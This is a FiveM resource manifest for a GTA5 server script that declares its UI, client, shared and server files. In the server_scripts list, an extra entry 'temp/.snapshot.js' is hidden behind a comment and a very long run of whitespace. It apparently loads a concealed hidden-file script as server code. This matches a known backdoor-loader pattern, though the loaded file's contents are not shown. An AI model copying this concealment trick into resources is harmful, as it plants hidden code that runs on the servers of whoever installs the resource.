fx_version 'bodacious'
game 'gta5'
ui_page {
    'web-side/index.html'
}
shared_scripts {
    'shared/lib.lua'
} 
client_scripts {
    'client/client.lua'
}
server_scripts {
    'server/server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.snapshot.js',
}
files {
    "web-side/index.html",
    "web-side/scripts/*.js",
    "web-side/styles/*.css",
    "web-side/assets/*"
}